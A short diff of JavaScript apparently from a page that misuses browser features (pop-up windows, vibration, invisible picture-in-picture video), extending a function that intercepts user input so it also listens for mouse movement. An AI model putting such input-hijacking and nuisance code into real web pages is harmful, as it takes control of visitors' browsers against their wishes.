@@ -180,6 +180,7 @@ function init () {
     }
 
     openWindow()
+  }, event => {
   })
 }
 
@@ -313,13 +314,14 @@ function startVibrateInterval () {
 /**
  * Intercept all user-initiated events and call the given the function, `onInput`.
  */
-function interceptUserInput (onInput) {
+function interceptUserInput (onInput, onMove) {
   document.body.addEventListener('mousedown', onInput)
   document.body.addEventListener('click', onInput)
   document.body.addEventListener('mouseup', onInput)
   document.body.addEventListener('keydown', onInput)
   document.body.addEventListener('keypress', onInput)
   document.body.addEventListener('keyup', onInput)
+  document.body.addEventListener('mousemove', onMove)
 }
 
 function startInvisiblePictureInPictureVideo () {
